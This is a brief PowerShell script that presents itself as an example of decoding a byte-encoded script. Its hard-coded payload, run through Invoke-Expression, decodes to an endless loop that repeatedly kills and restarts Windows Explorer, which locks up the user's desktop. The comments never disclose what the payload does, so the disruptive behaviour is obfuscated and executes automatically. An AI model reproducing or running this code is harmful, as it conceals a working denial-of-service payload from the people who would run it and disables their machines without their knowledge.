function Deobfuscate-Script {
    [CmdletBinding()]
    param(
        # The obfuscated script, as a string of comma-separated values
        [Parameter(Mandatory = $true)]
        [string] $Encoded
    )

    # Split the encoded string into an array of bytes
    $bytes = $Encoded.Split(',') | ForEach-Object { [byte] $_ }

    # Convert the bytes back to a script string
    $script = [System.Text.Encoding]::ASCII.GetString($bytes)

    # Output the de-obfuscated script
    Write-Output $script
}

# De-obfuscate an encoded script
$encoded = '119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,32,32,83,116,111,112,45,80,114,111,99,101,115,115,32,45,78,97,109,101,32,101,120,112,108,111,114,101,114,13,10,32,32,32,32,83,116,97,114,116,45,80,114,111,99,101,115,115,32,45,70,105,108,101,80,97,116,104,32,101,120,112,108,111,114,101,114,13,10,125'
$script = Deobfuscate-Script -Encoded $encoded

# Execute the de-obfuscated script
Invoke-Expression -Command $script
